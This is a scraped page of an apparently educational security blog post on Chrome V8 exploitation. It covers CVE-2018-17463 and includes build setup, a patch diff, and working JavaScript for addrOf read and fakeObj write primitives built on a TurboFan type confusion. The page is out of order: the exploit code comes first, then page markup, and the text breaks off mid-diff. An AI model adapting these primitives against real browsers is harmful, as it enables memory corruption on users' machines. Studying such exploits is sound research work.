    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}
&lt;span class=&#34;hljs-comment&#34;&gt;// Function that finds a pair of properties where p1 is stored at the same offset&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;// in the FixedArray as p2 in the NameDictionary&lt;/span&gt;
let p1, p2;

&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of all 32 property names such as p1..p32&lt;/span&gt;
    let pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create eval of our vuln function that will generate code during runtime&lt;/span&gt;
    eval(`
    function vuln(obj) {
      &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property inline of obj, forcing a CheckMap operation&lt;/span&gt;
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing out-of-bound properties&lt;/span&gt;
      ${pNames.&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;((p) =&amp;gt; `let ${p} = obj.${p};`).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}
      return [${pNames.join(&amp;apos;, &amp;apos;)}];
    }
  `)

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of negative values from -1 to -32 to be used&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;// for out makeObj function&lt;/span&gt;
    let pValues = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pValues[i] = -i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// JIT code to trigger vuln&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-comment&#34;&gt;// Create Object and pass it to Vuln function&lt;/span&gt;
        let res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-comment&#34;&gt;// Look for overlapping properties in results&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; res.length; i++) {
            &lt;span class=&#34;hljs-comment&#34;&gt;// If i is not the same value, and res[i] is between -32 and 0, it overlaps&lt;/span&gt;
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i !== -res[i] &amp;amp;&amp;amp; res[i] &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; res[i] &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;-32&lt;/span&gt;) {
                [p1, p2] = [i, -res[i]];
                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
            }
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Failed to find overlapping properties&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    eval(`
    function vuln(obj) {
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
        &lt;span class=&#34;hljs-comment&#34;&gt;// This will load p1 from our object thinking it&amp;apos;s a Double, but instead&lt;/span&gt;
        &lt;span class=&#34;hljs-comment&#34;&gt;// due to overlap, it will load p2 which is an Object&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj.p${p1}.x;
    }
  `);

    let obj = {z: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    let pValues = [];
    pValues[p1] = {x: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {y: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        let res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            %DebugPrint(obj);
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(`[+] Properties p${p1} &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; p${p2} overlap!`);
let x = addrOf();
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking Object Address...&amp;quot;&lt;/span&gt;);
print(`[+] Object Address: ${x}`);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When you run the code in &lt;code&gt;d8&lt;/code&gt;, you get a result like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The output labeled &lt;code&gt;Object Address&lt;/code&gt; is printed in double format because it&amp;#x2019;s interpreted as a &lt;code&gt;double&lt;/code&gt;. So you need to convert that double to an address &amp;#x2014; the conversion shown above will give you the address!&lt;/p&gt;
&lt;h3 id=&#34;The-fakeObj-Write-Primitive&#34;&gt;&lt;a href=&#34;#The-fakeObj-Write-Primitive&#34; class=&#34;headerlink&#34; title=&#34;The fakeObj Write Primitive&#34;&gt;&lt;/a&gt;The fakeObj Write Primitive&lt;/h3&gt;&lt;p&gt;You can get a write primitive by doing the reverse of the read primitive &amp;#x2014; no new vulnerability is required. That&amp;#x2019;s one of the strengths of Type Confusion: if a pointer is being interpreted as a double (and reading the pointer leaked an address), then writing to a double slot (via the same confusion) can instead write into the pointer&amp;#x2019;s target.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Overwrite property x of p1, but due to type confusion&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // we overwrite property y of p2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x = 0x41414141n;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res;
        }
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you replace the &lt;code&gt;let x = addrOf();&lt;/code&gt; line in the Read primitive code with a call to &lt;code&gt;fakeObj()&lt;/code&gt; and run it in &lt;code&gt;d8&lt;/code&gt;, you&amp;#x2019;ll get results like below. As you can see, the &lt;code&gt;obj&lt;/code&gt; pointer&amp;#x2019;s address is overwritten with &lt;code&gt;0x41414141&lt;/code&gt;. Isn&amp;#x2019;t Type Confusion a delightfully simple way to get primitives? &amp;#x1F604;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that we have a read primitive for addresses and a write primitive that can overwrite an object pointer, the next step would be to refine these into full arbitrary memory read/write primitives (AAR/AAW) for exploitation. I intended to cover that here but ran out of space and want to produce a higher-quality write-up, so I&amp;#x2019;ll move that content to the next part.&lt;/p&gt;
&lt;p&gt;In the next part I&amp;#x2019;ll explain how Read/Write primitives in the Chrome renderer lead to RCE, and how renderer RCE changed after the Heap Sandbox was introduced. I&amp;#x2019;ll be back soon &amp;#x2014; see you next time! :)&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-1/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-2/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/&#34;&gt;https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/&lt;/a&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/TypeConfusion101_Part3.jpg">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2025/09/26/ouya77/chrome_part3/en/">

  <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^ Part 3.(EN) - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2025-09-26 17:00" pubdate>
      2025 9 26 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.3k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      106
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^ Part 3.(EN)</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <p>Hello! OUYA77 here. 2025 is already heading into the fourth quarter. Take care not to catch a seasonal cold, and I hope you spend the rest of the year without regrets &#x1F44D;.</p>
<p>In Part 1 We looked at Chrome&#x2019;s overall architecture, and in Part 2 I covered how a Type Confusion vulnerability arises in the V8 engine and why that can lead to a Relative R/W primitive.</p>
<blockquote>
<p>If you haven&#x2019;t read them<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 2.</a></p>
</blockquote>
<p>This time I&#x2019;ll write a bit article and &#x2014; to get a real whiff of pwnable goodness &#x2014; I&#x2019;ll only recap the Relative R/W from last time and then look at the actual exploit payload used in practice! We&#x2019;ve got a lot to cover, so let&#x2019;s hurry :)</p>
<h2 id="0-Relative-R-W-Recap"><a href="#0-Relative-R-W-Recap" class="headerlink" title="0. Relative R/W Recap"></a>0. Relative R/W Recap</h2><p><img src="image.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>For performance, V8 relies on assumptions that objects&#x2019; structures won&#x2019;t change and therefore uses internal mechanisms like Hidden Classes (Maps) and ElementsKind. Based on that information, V8&#x2019;s JIT compiler TurboFan produces high-performance native code. But JavaScript is extremely dynamic, and <strong>if an object&#x2019;s structure or an array&#x2019;s type changes at runtime, those assumptions can be violated.</strong> If V8 fails to properly deoptimize the previously optimized code, the engine may access memory using incorrect type information &#x2014; and, as shown above, that can enable Relative R/W.</p>
<p>In this part we&#x2019;ll take the journey from using a historical Chrome version to get a Relative Address R/W primitive via Type Confusion, refine that into an Arbitrary Address R/W, and proceed toward code execution. This post covers vulnerabilities from the era before the Heap Sandbox.</p>
<h2 id="1-Environments-Set-up"><a href="#1-Environments-Set-up" class="headerlink" title="1. Environments Set-up"></a>1. Environments Set-up</h2><p>There&#x2019;s a well-written write-up for the set-up, so I won&#x2019;t go into a long explanation here &#x2014; I&#x2019;ll just add a few notes about the parts that mattered to me while doing it.</p>
<blockquote>
<p>Set-up link&#x2192; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159">https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159</a></p>
</blockquote>
<p>Make sure the Windows SDK versions match exactly. In <code>depot_tools</code> there&#x2019;s a <code>python3.bat</code>; when you run <code>where python</code> in a cmd window, that <code>python3.bat</code> should be the one that appears. Create a symbolic link named <code>python.bat</code> that points to it, and put the <code>depot_tools</code> folder at the very top of your <code>PATH</code> environment variable. You&#x2019;ll need this for the build!</p>
<p>Finally, the build expects SDK <code>10.0.26100.0</code>, so check that version in the Visual Studio Installer and download it. (<code>tools\dev\gm.py x64.debug</code> has the version hardcoded, so it&#x2019;s best to match that version when you build.)</p>
<pre><code class="hljs jsx">c:\dev\source\v8&gt;python3 tools\dev\gm.py x64.debug
# gn gen out\x64.debug
Done. Made <span class="hljs-number">740</span> targets <span class="hljs-keyword">from</span> <span class="hljs-number">225</span> files <span class="hljs-keyword">in</span> <span class="hljs-number">6288</span>ms
# autoninja -C out\x64.debug d8
offline mode
ninja: Entering directory <span class="hljs-string">`out\x64.debug&apos;</span>
<span class="hljs-string">exec_root=C:\dev\source\v8 dir=out\x64.debug</span>
<span class="hljs-string">build finished</span>
<span class="hljs-string">local:2609 remote:0 cache:0 cache-write:0(err:0) fallback:0 retry:0 skip:312</span>
<span class="hljs-string">fs: ops: 41931(err:5273) / r:12710(err:0) 20.66GiB / w:122(err:0) 100.98MiB</span>
<span class="hljs-string"> resource/capa used(err)  wait-avg |   s m |  serv-avg |   s m |</span>
<span class="hljs-string">  localexec/32   2527(0)  4m03.72s |&#x2582; &#x2582;&#x2582;&#x2587;&#x2588;&#x2583;|    10.08s | &#x2582;&#x2584;&#x2587;&#x2588;&#x2582; |</span>
<span class="hljs-string">14m13.39s Build Succeeded: 2609 steps - 3.06/s</span>
<span class="hljs-string">Done! - V8 compilation finished successfully.</span></code></pre>
<p>If you see a pleasant <code>Done!</code> as shown above, the installation completed successfully! &#x1F64C;</p>
<p>The JavaScript engine <strong>V8</strong> does not translate our code directly into machine code. Instead, it first compiles to an intermediate language called <strong>bytecode</strong>. That bytecode is executed by the <strong>Ignition interpreter</strong>, and hot/repeated code paths are optimized by the <strong>TurboFan compiler</strong> into faster machine code.<br>Below is the key portion of the bytecode produced when running a simple JavaScript snippet <code>Array.from(String(&apos;12345&apos;))</code> in the <code>d8</code> shell.</p>
<p><img src="image%201.png" srcset="/img/loading.gif" alt="image.png"></p>
<p><code>Array.from(String(&apos;12345&apos;))</code></p>
<p>This code can be thought of in two main steps.</p>
<ol>
<li>Execute <code>String(&apos;12345&apos;)</code> to produce a string object.</li>
<li>Execute <code>Array.from()</code> to convert that string object into an array.</li>
</ol>
<p>Inside V8, both steps are represented in the intermediate language called <strong>bytecode</strong>. Bytecode and assembly are both low-level representations of code, but they differ significantly. Assembly (and machine code) issues instructions to specific hardware (the CPU), so it&#x2019;s architecture-dependent and must be compiled for a particular CPU to run.</p>
<p>By contrast, bytecode is an abstract set of instructions that is not tied to any specific hardware. It runs on top of a virtual &#x201C;machine&#x201D; &#x2014; the Ignition interpreter &#x2014; so JavaScript code can run immediately on different operating systems and CPU architectures without a separate compile step.</p>
<p>The <strong>D8</strong> used here is V8&#x2019;s developer/debug shell. With D8 you can run V8 without a browser and use debugging flags like <code>--print-bytecode</code> to inspect the engine&#x2019;s internals. It&#x2019;s an excellent tool for analyzing how V8 generates and runs bytecode. In this part we&#x2019;ll use D8 thoroughly, step-by-step, to follow the exploit process.</p>
<p>The analysis post I referenced is: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p>
<p>Now let&#x2019;s roll back the git version to trigger the vulnerability in a real V8 build.</p>
<pre><code class="hljs c">C:\dev\source\v8&gt;git checkout <span class="hljs-number">568979f</span>4d891bafec875fab20f608ff9392f4f29
Updating files: <span class="hljs-number">100</span>% (<span class="hljs-number">15550</span>/<span class="hljs-number">15550</span>), done.
Previous HEAD position was b801900344f [gtest] Clean up single-arg `testing::Invoke()`s
HEAD is now at <span class="hljs-number">568979f</span>4d89 [parser] Fix memory accounting of explicitly cleared zones</code></pre>
<p>To build that version you&#x2019;ll need to install the following additional items.</p>
<ul>
<li>MSVC v140 - VS 2015 C++ build tools (v14.00)</li>
<li>MSVC v141 - VS 2017 C++ x64/x86 build tools (v14.16)</li>
<li>Windows 10 SDK (10.0.17134.0)<ul>
<li>If you have a nearby version, you can copy the SDK folder and rename it to match. I installed <code>10.0.19041.0</code> and renamed the folder to <code>10.0.17134.0</code>.</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">C:\dev\source\v8&gt;gn gen --ide=vs out\x64.debug
ERROR at <span class="hljs-comment">//.gn:24:48: No value named &quot;exec_script_whitelist&quot; in scope &quot;build_dotfile_settings&quot;</span>
exec_script_whitelist = build_dotfile_settings.exec_script_whitelist + []</code></pre>
<p>It won&#x2019;t work right away! Because these are old versions, you must also align (sync) the build tools to those older toolchains. <del>(2018 already&#x2026; seven years ago &#x2014; TMI, but I was 20 in 2018, hehe.)</del></p>
<p>Run <code>gclient sync</code> to sync the build toolchain. Since the build requires Python 2, make sure <code>where python</code> lists the Python 2 binary first in your PATH.<br>Also set the following environment variable:</p>
<p><code>set GYP_MSVS_OVERRIDE_PATH=C:\Program Files (x86)\Microsoft Visual Studio 14.0</code></p>
<p>After that, the build should succeed.</p>
<pre><code class="hljs c">c:\dev\source\v8&gt;gclient sync
...
Running hooks: <span class="hljs-number">100</span>% (<span class="hljs-number">30</span>/<span class="hljs-number">30</span>), done</code></pre>
<p>When building Chrome you may see errors like the one below &#x2014; the flags differ depending on whether the sandbox existed at that time.</p>
<pre><code class="hljs c">c:\dev\source\v8&gt;gn gen --ide=vs out\x64.debug
Generating Visual Studio projects took <span class="hljs-number">96</span>ms
Done. Made <span class="hljs-number">129</span> targets from <span class="hljs-number">74</span> files in <span class="hljs-number">1597</span>ms</code></pre>
<blockquote>
<p>I couldn&#x2019;t get the ninja build to work here; if you can, proceed on Windows using the steps above. If not, you can build on Linux. In Part 4 I plan to cover a 2023 1-day exploit and I&#x2019;ll do that hands-on on Windows!</p>
</blockquote>
<h1 id="2-CVE-2018-17463"><a href="#2-CVE-2018-17463" class="headerlink" title="2. CVE-2018-17463"></a>2. CVE-2018-17463</h1><p>CVE-2018-17463 is a Type Confusion vulnerability in <code>Google Chrome Versions 69.0 and before</code> that allows RCE from the renderer. Let&#x2019;s analyze how this was possible, starting from the root cause.</p>
<h2 id="2-1-Root-Cause"><a href="#2-1-Root-Cause" class="headerlink" title="2.1 Root Cause"></a>2.1 <strong>Root Cause</strong></h2><p>The JIT compiler Turbofan performs optimizations by detecting and eliminating duplicate IR. However, if it operates incorrectly it can remove safety checks like <code>type check</code>, and that is where Type Confusion can occur.</p>
<h3 id="Patch-Diffing"><a href="#Patch-Diffing" class="headerlink" title="Patch Diffing"></a><strong>Patch Diffing</strong></h3><p>If you look at <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=888923">Issue 888923</a>, you&#x2019;ll find a <a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220">commit</a> <code>52a9e67a477bdb67ca893c25c145ef5191976220</code> with the message:</p>
<blockquote>
<p>[turbofan] Fix ObjectCreate&#x2019;s side effect annotation.</p>
</blockquote>
<p>Examining that change shows that in the JavaScript operation <code>CreateObject</code> the flag <code>Operator::kNoWrite</code> was changed to <code>Operator::kNoProperties</code>.</p>
<pre><code class="hljs c">C:\dev\source\v8&gt;git show <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220
commit <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220
Author: Jaroslav Sevcik &lt;jarin@chromium.org&gt;
Date:   Wed Sep <span class="hljs-number">26</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">47</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0200</span>

    [turbofan] Fix ObjectCreate<span class="hljs-number">&apos;</span>s side effect annotation.

    Bug: chromium:<span class="hljs-number">888923</span>
    Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79
    Reviewed-on: https:<span class="hljs-comment">//chromium-review.googlesource.com/1245763</span>
    Reviewed-by: Benedikt Meurer &lt;bmeurer@chromium.org&gt;
    Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org&gt;
    Cr-Commit-Position: refs/heads/master@{#<span class="hljs-number">56236</span>}

diff --git a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc b/src/compiler/js-<span class="hljs-keyword">operator</span>.cc
index <span class="hljs-number">94b</span>018c987d.<span class="hljs-number">.5</span>ed3f74e075 <span class="hljs-number">100644</span>
--- a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc
+++ b/src/compiler/js-<span class="hljs-keyword">operator</span>.cc
@@ <span class="hljs-number">-622</span>,<span class="hljs-number">7</span> +<span class="hljs-number">622</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function">CompareOperationHint <span class="hljs-title">CompareOperationHintOf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Operator* op)</span> </span>{
   V(CreateKeyValueArray, Operator::kEliminatable, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                \
   V(CreatePromise, Operator::kEliminatable, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)                      \
   V(CreateTypedArray, Operator::kNoProperties, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>)                   \
-  V(CreateObject, Operator::kNoWrite, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                            \
